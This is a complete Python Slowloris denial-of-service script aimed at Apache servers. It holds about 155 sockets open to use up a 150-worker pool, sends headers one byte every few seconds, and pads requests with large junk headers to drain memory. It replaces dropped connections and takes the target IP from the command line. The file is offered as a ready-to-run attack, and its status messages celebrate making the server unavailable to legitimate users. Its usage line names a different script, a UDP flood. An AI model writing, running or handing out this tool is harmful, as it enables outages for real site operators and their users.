import socket
import random
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

class UltimateSlowloris():
    def __init__(self, ip, port=80, sockets_count=155):  # 155 to exceed 150 worker limit
        self._ip = ip
        self._port = port
        self._sockets_count = sockets_count
        self._sockets = []
        self._active_connections = 0
        self._lock = threading.Lock()
        self._attack_active = True
        
        # Enhanced headers to exploit no size limits
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding: gzip,deflate",
            "Keep-Alive: 900",
            "Connection: keep-alive"
        ]
        
        # Add massive headers to exploit memory (no LimitRequestFieldSize)
        for i in range(50):  # 50 extra large headers
            large_value = "A" * 10000  # 10KB per header value
            self._headers.append(f"X-Memory-Drain-{i}: {large_value}")
        
        print(" INITIALIZING ULTIMATE SLOWLORIS ATTACK")
        print(f"   - Target: {ip}:{port}")
        
        self.establish_initial_connections()

    def get_message(self, message):
        """Generate random messages to avoid caching"""
        random_num = random.randint(0, 9999)
        return f"{message}{random_num} HTTP/1.1\r\n".encode("utf-8")

    def create_socket_connection(self, socket_id):
        """Create individual socket connection with aggressive settings"""
        max_attempts = 5
        for attempt in range(max_attempts):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)  # Increased timeout for slow operations
                
                # Aggressive socket options
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Connect to target
                s.connect((self._ip, self._port))
                
                # Send initial partial request - EXPLOITING NO TIMEOUTS
                initial_request = f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n".encode()
                s.send(initial_request)
                
                # Send headers VERY SLOWLY - 1 byte every 2 seconds
                for header in self._headers:
                    header_bytes = f"{header}\r\n".encode()
                    for i in range(0, len(header_bytes), 1):  # Send 1 byte at a time
                        if not self._attack_active:
                            return None
                        try:
                            s.send(header_bytes[i:i+1])
                            time.sleep(2)  # 2 seconds between bytes - SERVER WAITS 10 MINUTES
                        except:
                            break
                
                with self._lock:
                    self._sockets.append(s)
                    self._active_connections += 1
                    
                print(f"Socket {socket_id}: Connection established and holding ({self._active_connections}/155 active)")
                return s
                
            except Exception as e:
                print(f"Socket {socket_id}: Attempt {attempt+1} failed - {str(e)}")
                time.sleep(1)
        
        print(f" Socket {socket_id}: Failed to establish after {max_attempts} attempts")
        return None

    def establish_initial_connections(self):
        """Establish all connections in parallel using threading"""
        print(f" Establishing {self._sockets_count} parallel connections...")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(self.create_socket_connection, range(self._sockets_count)))
        
        successful = len([r for r in results if r is not None])
        print(f"Initial connection phase complete: {successful}/{self._sockets_count} sockets active")

    def maintain_connection(self, socket_obj, socket_id):
        """Maintain a single connection with ultra-slow data sending"""
        bytes_sent = 0
        while self._attack_active and socket_obj in self._sockets:
            try:
                # Send keep-alive data VERY SLOWLY
                # Exploiting: RequestReadTimeout header=0-600,minrate=1
                keep_alive_data = f"X-Slowloris-{random.randint(1000, 9999)}: {random.randint(1000, 9999)}\r\n".encode()
                
                # Send 1 byte every 30 seconds - WELL BELOW 1 byte/second minimum
                for byte in keep_alive_data:
                    socket_obj.send(bytes([byte]))
                    bytes_sent += 1
                    time.sleep(30)  # 30 seconds between bytes - SERVER CAN'T TIMEOUT!
                    
                    if bytes_sent % 10 == 0:
                        print(f" Socket {socket_id}: Keeping alive ({bytes_sent} bytes sent)")
                        
            except Exception as e:
                print(f"Socket {socket_id}: Connection lost - {str(e)}")
                with self._lock:
                    if socket_obj in self._sockets:
                        self._sockets.remove(socket_obj)
                        self._active_connections -= 1
                break

    def start_connection_maintenance(self):
        """Start maintenance threads for all active connections"""
        print(" Starting connection maintenance threads...")
        maintenance_threads = []
        
        for i, sock in enumerate(self._sockets[:]):  # Use slice copy
            thread = threading.Thread(target=self.maintain_connection, args=(sock, i))
            thread.daemon = True
            thread.start()
            maintenance_threads.append(thread)
        
        return maintenance_threads

    def monitor_connections(self):
        """Continuously monitor and replace dead connections"""
        print("Starting connection monitor...")
        while self._attack_active:
            current_count = self._active_connections
            required_count = self._sockets_count
            
            if current_count < required_count * 0.9:  # If we lost more than 10%
                needed = required_count - current_count
                print(f" Replacing {needed} dead connections...")
                
                replacement_threads = []
                for i in range(needed):
                    thread = threading.Thread(target=self.create_socket_connection, 
                                            args=(f"replacement-{i}",))
                    thread.daemon = True
                    thread.start()
                    replacement_threads.append(thread)
                
                for thread in replacement_threads:
                    thread.join()
            
            time.sleep(10)  # Check every 10 seconds

    def attack(self, duration=600):  # Default 10 minutes to match server timeout
        """Execute the complete attack"""
        print(f"STARTING MAIN ATTACK PHASE - Duration: {duration} seconds")
        start_time = time.time()
        
        # Start maintenance for existing connections
        maintenance_threads = self.start_connection_maintenance()
        
        # Start connection monitor
        monitor_thread = threading.Thread(target=self.monitor_connections)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Main attack loop
        try:
            while time.time() - start_time < duration and self._attack_active:
                current_time = time.time() - start_time
                remaining = duration - current_time
                
                print(f"Attack Status: {int(current_time)}s elapsed, {int(remaining)}s remaining")
                print(f"Active Connections: {self._active_connections}/155")
                print(f"Worker Exhaustion: {min(100, int((self._active_connections / 150) * 100))}%")
                
                # Calculate attack effectiveness
                if self._active_connections >= 151:
                    print(" MAXIMUM IMPACT: All 150 Apache workers exhausted!")
                    print(" SERVER IS COMPLETELY UNAVAILABLE TO LEGITIMATE USERS!")
                elif self._active_connections >= 100:
                    print("  HIGH IMPACT: Server severely degraded")
                else:
                    print("MEDIUM IMPACT: Server performance affected")
                
                time.sleep(10)  # Status update every 10 seconds
                
        except KeyboardInterrupt:
            print("\n Attack interrupted by user")
            sys.exit(1) 
        
        finally:
            self._attack_active = False
            self.cleanup()
            
            print(" ATTACK COMPLETE")
            print(f" Final Stats: {self._active_connections} connections maintained")
            print(" Server should be completely unresponsive to legitimate users")

    def cleanup(self):
        """Clean up all connections"""
        print(" Cleaning up connections...")
        with self._lock:
            for sock in self._sockets:
                try:
                    sock.close()
                except:
                    pass
            self._sockets.clear()
            self._active_connections = 0

def test_server_vulnerability(ip, port=80):
    """Test if server is vulnerable before attacking"""
    print(" Testing server vulnerability...")
    
    try:
        # Test basic connectivity
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(5)
        test_sock.connect((ip, port))
        test_sock.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
        response = test_sock.recv(1024)
        test_sock.close()
        
        if b"Apache" in response:
            print(" Apache server detected")
        else:
            print("  Unknown server type - attack may not work")
            
        return True
        
    except Exception as e:
        print(f"Cannot connect to server: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: sudo python3 uber_udp_flood.py TARGET_IP")
        exit(1)

    target_ip = sys.argv[1]
    target_port = 80
    
    print("=" * 60)
    print("  SLOWLORIS ATTACK ")
    print("=" * 60)
    
    # Test server first
    if not test_server_vulnerability(target_ip, target_port):
        print("Target server not accessible. Exiting.")
        sys.exit(1)
    
    try:
        # Get attack parameters
        duration = int(input("Enter attack duration in seconds (default 600): ") or "600")
        connections = int(input("Enter number of connections (default 155): ") or "155")
        
        print(f"\n STARTING ATTACK WITH:")
        print(f"   - Duration: {duration} seconds")
        print(f"   - Connections: {connections}")
        print(f"   - Target: {target_ip}:{target_port}")
        print("\n Attack starting in 3 seconds...")
        time.sleep(3)
        
        # Initialize and start attack
        attacker = UltimateSlowloris(target_ip, target_port, connections)
        attacker.attack(duration)
        
    except KeyboardInterrupt:
        print("\n Script terminated by user")
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error: {e}")